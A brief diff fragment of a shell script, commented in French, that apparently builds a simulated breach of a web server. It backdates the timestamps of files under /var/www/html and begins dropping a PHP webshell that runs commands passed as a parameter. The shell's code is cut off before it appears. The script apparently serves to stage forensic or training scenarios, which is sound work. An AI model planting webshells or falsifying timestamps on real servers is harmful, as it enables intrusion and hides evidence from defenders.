@@ -52,6 +52,7 @@ find /var/www/html -type f -exec touch -d "@$(( BASE - 2592000 ))" {} + 2>/dev/n
 ########################################
 # 1. Webshell depose via le formulaire d'upload
 ########################################
+mkdir -p "$(dirname "$SHELL_PATH")"
 cat > "$SHELL_PATH" << 'PHP'
 <?php
 // Fichier depose par l'attaquant. Execute une commande passee en parametre.
